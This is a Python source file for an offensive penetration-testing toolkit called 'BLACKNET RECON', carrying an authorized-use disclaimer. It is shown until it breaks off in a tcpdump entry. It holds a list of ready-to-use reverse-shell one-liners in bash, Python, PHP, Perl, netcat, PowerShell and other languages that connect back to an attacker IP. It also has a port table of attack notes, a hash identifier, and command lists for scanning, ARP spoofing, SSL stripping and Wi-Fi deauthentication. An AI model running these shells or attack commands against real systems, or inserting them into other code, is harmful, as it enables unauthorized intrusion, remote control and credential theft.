#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║      BLACKNET RECON  ·  Pro Penetration Testing Toolkit          ║
║      For authorized use on systems you own / have permission     ║
║      Unauthorized use is illegal. Educational purposes only.     ║
╚══════════════════════════════════════════════════════════════════╝
"""

# ─────────────────────────────────────────────────────────────────
#  STANDARD LIBRARY IMPORTS  (no pip needed for these)
# ─────────────────────────────────────────────────────────────────
import sys
import os
import time
import base64
import urllib.parse
import subprocess
import re
import binascii
import codecs
import hashlib
import socket
import datetime

# ─────────────────────────────────────────────────────────────────
#  THIRD-PARTY LIBRARY IMPORT  (pip install rich)
# ─────────────────────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.prompt import Prompt
    from rich import box
    from rich.align import Align
    from rich.rule import Rule
    from rich.columns import Columns
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.syntax import Syntax
except ImportError:
    print("\n[!] 'rich' library missing.  Fix:  pip install rich\n")
    sys.exit(1)

# ─────────────────────────────────────────────────────────────────
#  GLOBAL CONSOLE
# ─────────────────────────────────────────────────────────────────
console = Console()

# ─────────────────────────────────────────────────────────────────
#  DARK / BLOOD THEME  — tweak hex colours here if needed
# ─────────────────────────────────────────────────────────────────
T = {
    "banner"      : "bold red",
    "drip"        : "bold dark_red",
    "caption"     : "bold bright_red",
    "caption2"    : "dim red",
    "menu_title"  : "bold bright_red",
    "menu_idx"    : "red",
    "menu_item"   : "bold white",
    "menu_desc"   : "dim white",
    "section"     : "bold red",
    "cmd"         : "bright_green",
    "cmd_desc"    : "white",
    "highlight"   : "bold bright_white",
    "error"       : "bold red",
    "success"     : "bold green",
    "info"        : "bold cyan",
    "warn"        : "bold yellow",
    "border"      : "red",
    "border2"     : "dark_red",
    "prompt"      : "bold red",
    "tag"         : "dim green",
    "tool_hdr"    : "bold bright_red",
    "gen_out"     : "bold bright_green",
    "port_num"    : "bold red",
    "port_svc"    : "bold white",
    "port_note"   : "dim cyan",
    "hash_match"  : "bold bright_green",
    "hash_mode"   : "bold yellow",
}

# ══════════════════════════════════════════════════════════════════
#  BLOOD-DRIP BANNER
#  Characters used for drip effect: ▓ ▐█▌ ▐▌ ▌ ●
# ══════════════════════════════════════════════════════════════════
BANNER = r"""
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                                                        ▓
▓  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗███╗  ██╗███████╗████████╗  ▓
▓  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝████╗ ██║██╔════╝╚══██╔══╝  ▓
▓  ██████╔╝██║     ███████║██║     █████╔╝  ██╔██╗██║█████╗     ██║    ▓
▓  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗  ██║╚████║██╔══╝     ██║    ▓
▓  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗ ██║ ╚███║███████╗   ██║    ▓
▓  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝   ╚═╝    ▓
▓                                                                        ▓
▓      ██████╗ ███████╗ ██████╗ ██████╗ ███╗  ██╗                       ▓
▓      ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗ ██║                       ▓
▓      ██████╔╝█████╗  ██║     ██║   ██║██╔██╗██║                       ▓
▓      ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚████║                       ▓
▓      ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚███║                       ▓
▓      ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚══╝                       ▓
▓                                                                        ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  ▐█▌  ▐█▌  ▐█▌    ▐█▌   ▐█▌  ▐█▌   ▐█▌  ▐█▌    ▐█▌  ▐█▌   ▐█▌  ▐█▌
   ▐▌         ▐▌    ▐▌          ▐▌    ▐▌           ▐▌         ▐▌
    ▌               ▌                  ▌                        ▌
    ●         ●          ●       ●           ●            ●
"""

CAPTION  = "made by Mr.Blade  ·  Telegram @mrbladestalker35"
VERSION  = "v3.0 PRO"
TAGLINE  = "Advanced Penetration Testing Toolkit"
BUILD_DT = datetime.datetime.now().strftime("%Y-%m-%d")

# ══════════════════════════════════════════════════════════════════
#  REVERSE SHELL TEMPLATES
#  Placeholders: {ip} = attacker IP,  {port} = listener port
#  Add more templates by appending to REVSHELL_TEMPLATES list.
# ══════════════════════════════════════════════════════════════════
REVSHELL_TEMPLATES = [
    {
        "name"  : "Bash TCP",
        "lang"  : "bash",
        "shell" : "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    },
    {
        "name"  : "Bash UDP",
        "lang"  : "bash",
        "shell" : "bash -i >& /dev/udp/{ip}/{port} 0>&1",
    },
    {
        "name"  : "Python 3",
        "lang"  : "python3",
        "shell" : "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    },
    {
        "name"  : "Python 2",
        "lang"  : "python2",
        "shell" : "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    },
    {
        "name"  : "PHP (proc_open)",
        "lang"  : "php",
        "shell" : "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
    },
    {
        "name"  : "PHP (exec)",
        "lang"  : "php",
        "shell" : 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    },
    {
        "name"  : "Perl",
        "lang"  : "perl",
        "shell" : "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    },
    {
        "name"  : "Ruby",
        "lang"  : "ruby",
        "shell" : "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    },
    {
        "name"  : "Netcat (Traditional)",
        "lang"  : "nc",
        "shell" : "nc -e /bin/sh {ip} {port}",
    },
    {
        "name"  : "Netcat (OpenBSD / No -e)",
        "lang"  : "nc",
        "shell" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    },
    {
        "name"  : "Socat",
        "lang"  : "socat",
        "shell" : "socat TCP:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane",
    },
    {
        "name"  : "PowerShell (Windows)",
        "lang"  : "powershell",
        "shell" : "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\">\";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    },
    {
        "name"  : "Java",
        "lang"  : "java",
        "shell" : 'r = Runtime.getRuntime();p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"}});p.waitFor();',
    },
    {
        "name"  : "Go (Golang)",
        "lang"  : "go",
        "shell" : 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
    },
    {
        "name"  : "Awk",
        "lang"  : "awk",
        "shell" : "awk 'BEGIN {{s=\"/inet/tcp/0/{ip}/{port}\";while(42){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline)>0)print |& s;close(c)}}}}while(c!=\"exit\")close(s)}}}}'",
    },
    {
        "name"  : "Lua",
        "lang"  : "lua",
        "shell" : "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    },
]

# ══════════════════════════════════════════════════════════════════
#  PORT REFERENCE TABLE
#  Add entries as {"port":..., "proto":..., "svc":..., "note":...}
# ══════════════════════════════════════════════════════════════════
PORT_REFERENCE = [
    {"port": 21,    "proto": "TCP", "svc": "FTP",          "note": "Anonymous login? Bruteforce creds. Check for writable dirs."},
    {"port": 22,    "proto": "TCP", "svc": "SSH",           "note": "Try default creds, key auth, old algos, CVE-2023-38408."},
    {"port": 23,    "proto": "TCP", "svc": "Telnet",        "note": "Cleartext. Sniff creds. Default creds common on IoT."},
    {"port": 25,    "proto": "TCP", "svc": "SMTP",          "note": "Open relay? User enum via VRFY/EXPN. Mail injection."},
    {"port": 53,    "proto": "TCP/UDP","svc":"DNS",         "note": "Zone transfer (AXFR). Subdomain enum. DNS rebinding."},
    {"port": 69,    "proto": "UDP", "svc": "TFTP",          "note": "No auth. Try GET /etc/passwd. Common on Cisco devices."},
    {"port": 80,    "proto": "TCP", "svc": "HTTP",          "note": "Full web app testing: SQLi, XSS, dir brute, vuln scan."},
    {"port": 88,    "proto": "TCP", "svc": "Kerberos",      "note": "AS-REP Roasting, Kerberoasting, Pass-the-Ticket."},
    {"port": 110,   "proto": "TCP", "svc": "POP3",          "note": "Read emails. Brute creds. Often cleartext."},
    {"port": 111,   "proto": "TCP", "svc": "RPC",           "note": "rpcinfo -p target. NFS mount point enumeration."},
    {"port": 135,   "proto": "TCP", "svc": "MSRPC",         "note": "WMI, DCOM attacks. Pivot point in AD environments."},
    {"port": 139,   "proto": "TCP", "svc": "NetBIOS",       "note": "SMB over NetBIOS. Enum shares, users, sessions."},
    {"port": 143,   "proto": "TCP", "svc": "IMAP",          "note": "Read emails. Cred brute. Check for STARTTLS downgrade."},
    {"port": 161,   "proto": "UDP", "svc": "SNMP",          "note": "Community string guess (public/private). MIB walk for info."},
    {"port": 389,   "proto": "TCP", "svc": "LDAP",          "note": "AD enum: users, groups, OUs. Null bind possible?"},
    {"port": 443,   "proto": "TCP", "svc": "HTTPS",         "note": "TLS cert info. Full web testing. Check cipher suites."},
    {"port": 445,   "proto": "TCP", "svc": "SMB",           "note": "EternalBlue (MS17-010), PrintNightmare. Share enum."},
    {"port": 512,   "proto": "TCP", "svc": "rexec",         "note": "Remote exec without encryption. Often allows root."},
    {"port": 513,   "proto": "TCP", "svc": "rlogin",        "note": "Cleartext remote login. Check .rhosts for trust abuse."},
    {"port": 514,   "proto": "TCP", "svc": "rsh",           "note": "Remote shell. No auth if .rhosts trusts you."},
    {"port": 587,   "proto": "TCP", "svc": "SMTP-Auth",     "note": "SMTP submission with auth. Credential brute force."},
    {"port": 631,   "proto": "TCP", "svc": "CUPS",          "note": "Printer service. CVE-2024-47176 RCE. Web UI at :631."},
    {"port": 636,   "proto": "TCP", "svc": "LDAPS",         "note": "LDAP over SSL. AD enum with valid creds. Cert check."},
    {"port": 873,   "proto": "TCP", "svc": "rsync",         "note": "List modules: rsync target::  — often world-readable."},
    {"port": 1080,  "proto": "TCP", "svc": "SOCKS",         "note": "Proxy pivot. Check for open SOCKS5 proxies."},
    {"port": 1433,  "proto": "TCP", "svc": "MSSQL",         "note": "xp_cmdshell RCE. SA brute. impacket mssqlclient.py."},
    {"port": 1521,  "proto": "TCP", "svc": "Oracle DB",     "note": "TNS poison. SID enum. Default creds: scott/tiger."},
    {"port": 2049,  "proto": "TCP", "svc": "NFS",           "note": "showmount -e target. Mount shares, check perms."},
    {"port": 2181,  "proto": "TCP", "svc": "ZooKeeper",     "note": "Unauthenticated data read. Often no auth in prod."},
    {"port": 3000,  "proto": "TCP", "svc": "Dev/Grafana",   "note": "Grafana default admin:admin. Node.js app common here."},
    {"port": 3306,  "proto": "TCP", "svc": "MySQL",         "note": "Root with empty pass? UDF exploit for RCE. SQLi pivot."},
    {"port": 3389,  "proto": "TCP", "svc": "RDP",           "note": "BlueKeep CVE-2019-0708. Brute creds. Pass-the-Hash."},
    {"port": 4444,  "proto": "TCP", "svc": "Meterpreter",   "note": "Default Metasploit listener. Change in real engagements!"},
    {"port": 4505,  "proto": "TCP", "svc": "SaltStack",     "note": "CVE-2020-11651 RCE. Auth bypass in Salt master."},
    {"port": 5432,  "proto": "TCP", "svc": "PostgreSQL",    "note": "COPY TO/FROM for file read/write. pg_hba.conf check."},
    {"port": 5601,  "proto": "TCP", "svc": "Kibana",        "note": "CVE-2019-7609 RCE. Often no auth. Canvas shell escape."},
    {"port": 5900,  "proto": "TCP", "svc": "VNC",           "note": "No auth or weak passwd. Try empty or 'password'."},
    {"port": 5985,  "proto": "TCP", "svc": "WinRM-HTTP",    "note": "evil-winrm shell. CrackMapExec. Needs creds."},
    {"port": 5986,  "proto": "TCP", "svc": "WinRM-HTTPS",   "note": "evil-winrm -S flag. SSL WinRM. Same attacks as 5985."},
    {"port": 6379,  "proto": "TCP", "svc": "Redis",         "note": "No auth default. Write SSH keys or cron via SLAVEOF."},
    {"port": 6443,  "proto": "TCP", "svc": "K8s API",       "note": "Kubernetes API server. Anonymous access? Pod escape."},
    {"port": 8080,  "proto": "TCP", "svc": "HTTP-Alt",      "note": "Dev/proxy port. Tomcat manager default creds."},
    {"port": 8443,  "proto": "TCP", "svc": "HTTPS-Alt",     "note": "Alt HTTPS. Splunk, Confluence, FortiGate often here."},
    {"port": 8500,  "proto": "TCP", "svc": "Consul",        "note": "HashiCorp Consul — RCE via service registration."},
    {"port": 9000,  "proto": "TCP", "svc": "PHP-FPM",       "note": "FastCGI attack (Gopherus). LFI to RCE pivot."},
    {"port": 9090,  "proto": "TCP", "svc": "Prometheus",    "note": "Metrics leak. Often no auth. /metrics endpoint."},
    {"port": 9200,  "proto": "TCP", "svc": "Elasticsearch", "note": "No auth default. RCE via script. Sensitive data dump."},
    {"port": 11211, "proto": "TCP", "svc": "Memcached",     "note": "stats, get, set — no auth. Cache poisoning."},
    {"port": 27017, "proto": "TCP", "svc": "MongoDB",       "note": "No auth default. Dump all DBs. Ransomware target."},
    {"port": 27017, "proto": "TCP", "svc": "MongoDB",       "note": "mongodump or mongo shell: show dbs; use db; db.col.find()"},
    {"port": 50000, "proto": "TCP", "svc": "SAP",           "note": "SAP Dispatcher. CVE-2020-6287 (RECON). No auth RCE."},
]

# ══════════════════════════════════════════════════════════════════
#  HASH SIGNATURE DATABASE
#  Used by the built-in Hash Identifier
# ══════════════════════════════════════════════════════════════════
HASH_SIGNATURES = [
    {"regex": r"^\$2[ayb]\$.{56}$",                "name": "bcrypt",               "hc": 3200,   "john": "bcrypt"},
    {"regex": r"^\$6\$.{8,16}\$.{86}$",            "name": "SHA-512crypt (Linux)", "hc": 1800,   "john": "sha512crypt"},
    {"regex": r"^\$5\$.{8,16}\$.{43}$",            "name": "SHA-256crypt (Linux)", "hc": 7400,   "john": "sha256crypt"},
    {"regex": r"^\$1\$.{8}\$.{22}$",               "name": "MD5crypt (Linux)",     "hc": 500,    "john": "md5crypt"},
    {"regex": r"^\$apr1\$.{8}\$.{22}$",            "name": "Apache MD5",           "hc": 1600,   "john": "md5crypt"},
    {"regex": r"^\$P\$.{31}$",                     "name": "WordPress / phpBB3",   "hc": 400,    "john": "phpass"},
    {"regex": r"^\$H\$.{31}$",                     "name": "phpBB3",               "hc": 400,    "john": "phpass"},
    {"regex": r"^\*[0-9A-Fa-f]{40}$",             "name": "MySQL 4.1+ (SHA1)",    "hc": 300,    "john": "mysql-sha1"},
    {"regex": r"^[0-9A-Fa-f]{128}$",              "name": "SHA-512",              "hc": 1700,   "john": "raw-sha512"},
    {"regex": r"^[0-9A-Fa-f]{64}$",               "name": "SHA-256",              "hc": 1400,   "john": "raw-sha256"},
    {"regex": r"^[0-9A-Fa-f]{56}$",               "name": "SHA-224",              "hc": 1300,   "john": "raw-sha224"},
    {"regex": r"^[0-9A-Fa-f]{40}$",               "name": "SHA-1",                "hc": 100,    "john": "raw-sha1"},
    {"regex": r"^[0-9A-Fa-f]{32}$",               "name": "MD5 or NTLM",          "hc": 0,      "john": "raw-md5"},
    {"regex": r"^[0-9A-Fa-f]{16}$",               "name": "MySQL < 4.1 (OLD)",    "hc": 200,    "john": "mysql"},
    {"regex": r"^[0-9A-Fa-f]{8}$",                "name": "CRC32",                "hc": 11500,  "john": "crc32"},
    {"regex": r"^[a-zA-Z0-9./]{13}$",             "name": "DES (Unix crypt)",     "hc": 1500,   "john": "descrypt"},
    {"regex": r"^[A-Z0-9./]{13}$",                "name": "DES (Unix crypt)",     "hc": 1500,   "john": "descrypt"},
    {"regex": r"^\{SHA\}[A-Za-z0-9+/]{28}=$",     "name": "LDAP SHA1",            "hc": 101,    "john": "netsha1"},
    {"regex": r"^[0-9A-Fa-f]{96}$",               "name": "SHA-384",              "hc": 10800,  "john": "raw-sha384"},
    {"regex": r"^[0-9A-Fa-f]{48}$",               "name": "Tiger-192",            "hc": 20,     "john": "tiger"},
    {"regex": r"^[0-9A-Fa-f]{32}:[0-9a-z]{32}$",  "name": "MD5 + Salt",           "hc": 20,     "john": "dynamic_4"},
    {"regex": r"^\$S\$.{52}$",                     "name": "Drupal 7",             "hc": 7900,   "john": "drupal7"},
    {"regex": r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{16}","name": "Joomla > 2.5.18",     "hc": 11,     "john": "dynamic"},
    {"regex": r"^[0-9A-Fa-f]{32}:[0-9A-Fa-f]{32}","name": "WebEdition CMS",       "hc": 3721,   "john": "dynamic"},
]

# ══════════════════════════════════════════════════════════════════
#  COMMAND DATABASE
#  ──────────────────────────────────────────────────────────────
#  STRUCTURE:
#    COMMANDS[category_key] = {
#      "title"      : "Display Name",
#      "icon"       : "emoji",
#      "description": "short desc",
#      "tools": {
#         tool_key: {
#           "title"  : "...",
#           "about"  : "...",
#           "website": "...",
#           "commands": [
#              { "cmd":"...", "desc":"...", "tags":["..."] },
#           ]
#         }
#      }
#    }
#
#  ADD A TOOL: new key block in any "tools" dict
#  ADD A CATEGORY: new top-level key in COMMANDS
# ══════════════════════════════════════════════════════════════════
COMMANDS = {

    # ════════════════════════════════════════════════════════════
    #  01. RECONNAISSANCE & SCANNING
    # ════════════════════════════════════════════════════════════
    "recon": {
        "title": "Reconnaissance & Scanning",
        "icon": "🔍",
        "description": "Passive/active info gathering, network & host discovery",
        "tools": {
            "nmap": {
                "title": "Nmap — Network Mapper",
                "about": "Industry-standard scanner: host discovery, port scan, version detection, OS fingerprint, NSE scripts.",
                "website": "https://nmap.org",
                "commands": [
                    {"cmd": "nmap -sn 192.168.1.0/24",
                     "desc": "Ping sweep — discovers live hosts on subnet without port scanning. Fast first-step recon.",
                     "tags": ["nmap","ping sweep","host discovery","recon"]},
                    {"cmd": "nmap -sV -sC -p- --open -T4 <target>",
                     "desc": "Full port scan + service/version + default NSE scripts. -p- hits all 65535 ports. Core pentest scan.",
                     "tags": ["nmap","full scan","version","scripts","all ports"]},
                    {"cmd": "nmap -sS -p 22,80,443,3306,8080 <target>",
                     "desc": "Stealth SYN scan on common ports. Half-open — less noisy than full TCP. Requires root.",
                     "tags": ["nmap","stealth","syn","recon","quiet"]},
                    {"cmd": "nmap -O --osscan-guess <target>",
                     "desc": "OS fingerprinting with aggressive guessing. Identifies Windows/Linux/embedded versions.",
                     "tags": ["nmap","os","fingerprint","detect"]},
                    {"cmd": "nmap -sU --top-ports 200 <target>",
                     "desc": "UDP scan on top 200 ports. Finds DNS(53), SNMP(161), NTP(123). Often overlooked.",
                     "tags": ["nmap","udp","dns","snmp","ntp"]},
                    {"cmd": "nmap --script vuln <target>",
                     "desc": "Runs all NSE vuln scripts. Auto-checks for known CVEs, EternalBlue, Shellshock, etc.",
                     "tags": ["nmap","vuln","cve","exploit","script"]},
                    {"cmd": "nmap --script smb-vuln-ms17-010 -p 445 <target>",
                     "desc": "Check EternalBlue / WannaCry on SMB port 445. Single-purpose fast check.",
                     "tags": ["nmap","smb","ms17-010","eternalblue","vuln"]},
                    {"cmd": "nmap -A -T4 <target> -oN scan.txt",
                     "desc": "Aggressive: OS + version + scripts + traceroute. Save to file for reporting.",
                     "tags": ["nmap","aggressive","output","report"]},
                    {"cmd": "nmap --script http-title,http-headers -p 80,443,8080 <target>",
                     "desc": "Grab HTTP titles + headers from web ports. Quick fingerprint without a browser.",
                     "tags": ["nmap","http","headers","title","web"]},
                    {"cmd": "nmap -sV --script=ldap-rootdse -p 389 <target>",
                     "desc": "Enumerate LDAP root DSE — reveals AD domain info, naming contexts.",
                     "tags": ["nmap","ldap","active directory","enum"]},
                ],
            },
            "recon_ng": {
                "title": "Recon-ng — OSINT Framework",
                "about": "Metasploit-style OSINT framework with marketplace modules for subdomain enum, WHOIS, breach data, etc.",
                "website": "https://github.com/lanmaster53/recon-ng",
                "commands": [
                    {"cmd": "recon-ng",
                     "desc": "Launch interactive console. All recon-ng operations start here.",
                     "tags": ["recon-ng","launch","osint"]},
                    {"cmd": "workspaces create <project>",
                     "desc": "[recon-ng] Create isolated workspace per engagement. Keeps results separate.",
                     "tags": ["recon-ng","workspace"]},
                    {"cmd": "marketplace install recon/domains-hosts/hackertarget",
                     "desc": "[recon-ng] Install HackerTarget subdomain enum module.",
                     "tags": ["recon-ng","subdomain","hackertarget"]},
                    {"cmd": "modules load recon/domains-hosts/hackertarget && options set SOURCE <domain> && run",
                     "desc": "[recon-ng] One-liner: load, set target domain, execute subdomain enum.",
                     "tags": ["recon-ng","run","subdomain","domain"]},
                    {"cmd": "modules load reporting/html && run",
                     "desc": "[recon-ng] Export all workspace data as HTML report.",
                     "tags": ["recon-ng","report","html","export"]},
                ],
            },
            "whatweb": {
                "title": "WhatWeb — Technology Fingerprinter",
                "about": "Identifies CMS, frameworks, server software, analytics platforms, and JS libraries.",
                "website": "https://github.com/urbanadventurer/WhatWeb",
                "commands": [
                    {"cmd": "whatweb -v <url>",
                     "desc": "Verbose fingerprint — detected technologies with version numbers.",
                     "tags": ["whatweb","fingerprint","version","cms","web"]},
                    {"cmd": "whatweb --aggression 3 <url>",
                     "desc": "Aggressive mode — more HTTP requests, better detection. Use when basic fails.",
                     "tags": ["whatweb","aggressive","scan"]},
                    {"cmd": "whatweb -i targets.txt --log-csv=out.csv",
                     "desc": "Bulk scan from file, export CSV. Efficient for large scope.",
                     "tags": ["whatweb","bulk","csv","multiple"]},
                ],
            },
            "amass": {
                "title": "Amass — Deep Subdomain Enumeration",
                "about": "OWASP-maintained passive/active subdomain enumeration using DNS, web archives, APIs, and crawling.",
                "website": "https://github.com/owasp-amass/amass",
                "commands": [
                    {"cmd": "amass enum -passive -d <domain> -o subs.txt",
                     "desc": "Passive-only subdomain enum (no direct target contact). Safe for recon.",
                     "tags": ["amass","subdomain","passive","osint"]},
                    {"cmd": "amass enum -active -d <domain> -brute -w /usr/share/wordlists/amass/subdomains.lst",
                     "desc": "Active enum + brute-force subdomains with wordlist. More thorough but noisier.",
                     "tags": ["amass","subdomain","brute","active"]},
                    {"cmd": "amass intel -whois -d <domain>",
                     "desc": "Pull WHOIS intelligence — related domains, IP blocks, ASNs from WHOIS data.",
                     "tags": ["amass","whois","intel","asn"]},
                    {"cmd": "amass viz -d3 -d <domain> -o graph.html",
                     "desc": "Generate interactive D3.js visual graph of discovered infrastructure.",
                     "tags": ["amass","visualize","graph","report"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  02. WEB VULNERABILITY SCANNERS
    # ════════════════════════════════════════════════════════════
    "web_vuln": {
        "title": "Web Vulnerability Scanners",
        "icon": "🕷",
        "description": "Automated web vuln discovery: misconfigs, CVEs, injection points",
        "tools": {
            "nikto": {
                "title": "Nikto — Web Server Scanner",
                "about": "Checks 6700+ dangerous files, outdated software, server misconfigurations, and common CVEs.",
                "website": "https://cirt.net/Nikto2",
                "commands": [
                    {"cmd": "nikto -h http://<target>",
                     "desc": "Basic scan — checks misconfigs, dangerous files, old software.",
                     "tags": ["nikto","scan","web","vuln","recon"]},
                    {"cmd": "nikto -h http://<target> -p 8080,8443,8888",
                     "desc": "Scan non-standard ports. Common on app servers like Tomcat, Spring.",
                     "tags": ["nikto","port","web"]},
                    {"cmd": "nikto -h http://<target> -o results.html -Format html",
                     "desc": "Save HTML report. Professional client deliverable format.",
                     "tags": ["nikto","output","html","report"]},
                    {"cmd": "nikto -h http://<target> -Tuning 4568",
                     "desc": "Tune: 4=Injection, 5=Remote file, 6=Denial of service, 8=Command exec.",
                     "tags": ["nikto","injection","tuning","rce"]},
                    {"cmd": "nikto -h http://<target> -useproxy http://127.0.0.1:8080",
                     "desc": "Route through Burp Suite to capture all nikto requests for review.",
                     "tags": ["nikto","proxy","burp","intercept"]},
                    {"cmd": "nikto -h http://<target> -id admin:admin123",
                     "desc": "Scan with HTTP Basic Auth creds. Use on password-protected endpoints.",
                     "tags": ["nikto","auth","credentials","basic"]},
                ],
            },
            "nuclei": {
                "title": "Nuclei — Template-Based Scanner",
                "about": "Fast, YAML-template driven scanner. Community templates cover CVEs, misconfigs, exposed panels, etc.",
                "website": "https://github.com/projectdiscovery/nuclei",
                "commands": [
                    {"cmd": "nuclei -u https://<target> -t cves/",
                     "desc": "Scan for all CVEs in the cves/ template folder. Best for known-vuln discovery.",
                     "tags": ["nuclei","cve","scan","web"]},
                    {"cmd": "nuclei -u https://<target> -t exposures/ -t misconfiguration/",
                     "desc": "Check for exposed sensitive files and server misconfigurations.",
                     "tags": ["nuclei","exposure","misconfiguration"]},
                    {"cmd": "nuclei -l urls.txt -t cves/ -c 50 -o nuclei-output.txt",
                     "desc": "Bulk scan: 50 concurrent workers across URL list, save results.",
                     "tags": ["nuclei","bulk","concurrent","output"]},
                    {"cmd": "nuclei -u https://<target> -tags rce,sqli,xss -severity critical,high",
                     "desc": "Filter by tags and severity — focus only on critical/high RCE, SQLi, XSS.",
                     "tags": ["nuclei","rce","sqli","xss","critical"]},
                    {"cmd": "nuclei -u https://<target> -t exposed-panels/",
                     "desc": "Detect exposed admin panels: phpmyadmin, grafana, jenkins, kibana, etc.",
                     "tags": ["nuclei","admin panel","exposed","web"]},
                ],
            },
        },
    },

    # ════════════════════════════════════════════════════════════
    #  03. DATA CAPTURE & MITM
    # ════════════════════════════════════════════════════════════
    "capture": {
        "title": "Data Capture & Network MITM",
        "icon": "📡",
        "description": "ARP spoofing, traffic interception, credential sniffing, SSL stripping",
        "tools": {
            "bettercap": {
                "title": "Bettercap — Network MITM Framework",
                "about": "All-in-one framework for ARP spoofing, MITM, credential capture, SSL strip, 802.11 attacks, BLE.",
                "website": "https://www.bettercap.org",
                "commands": [
                    {"cmd": "sudo bettercap -iface eth0",
                     "desc": "Launch on eth0 interface. Entry point for all network attacks.",
                     "tags": ["bettercap","launch","mitm","network"]},
                    {"cmd": "net.probe on",
                     "desc": "[bettercap] Probe network to discover live hosts. Populates host list.",
                     "tags": ["bettercap","probe","discovery"]},
                    {"cmd": "set arp.spoof.targets <victim_ip> && arp.spoof on",
                     "desc": "[bettercap] Set ARP target and enable poisoning. Routes victim traffic through attacker.",
                     "tags": ["bettercap","arp","spoof","mitm"]},
                    {"cmd": "net.sniff on",
                     "desc": "[bettercap] Start packet sniffer. Captures credentials, session tokens.",
                     "tags": ["bettercap","sniff","capture","credentials"]},
                    {"cmd": "set https.proxy.sslstrip true && https.proxy on",
                     "desc": "[bettercap] SSL strip HTTPS to HTTP — capture plaintext creds from 'secure' sites.",
                     "tags": ["bettercap","ssl strip","https","downgrade"]},
                    {"cmd": "http.proxy on",
                     "desc": "[bettercap] Enable transparent HTTP proxy for JS injection or content modification.",
                     "tags": ["bettercap","proxy","http","inject"]},
                    {"cmd": "wifi.recon on",
                     "desc": "[bettercap] Discover nearby WiFi access points and associated clients.",
                     "tags": ["bettercap","wifi","wireless","recon"]},
                    {"cmd": "wifi.deauth <bssid>",
                     "desc": "[bettercap] Deauth client from AP — force reconnect to capture WPA handshake.",
                     "tags": ["bettercap","deauth","wpa","handshake","wifi"]},
                    {"cmd": "set ticker.commands 'net.show; events.show 5' && ticker on",
                     "desc": "[bettercap] Live dashboard — auto-refresh host table + recent events every 5s.",
                     "tags": ["bettercap","dashboard","monitor","ticker"]},
                ],
            },
            "tcpdump": {
                "title": "TCPDump — CLI Packet Capture",
                "about": "Classic command-line packet sniffer. Capture, filter, and analyse network traffic.",
                "website": "https://www.tcpdump.org",
                "commands": [
                    {"cmd": "tcpdump -i eth0 -w capture.pcap",
                     "desc": "Capture all traffic on eth0 to PCAP file. Open in Wireshark for analysis.",
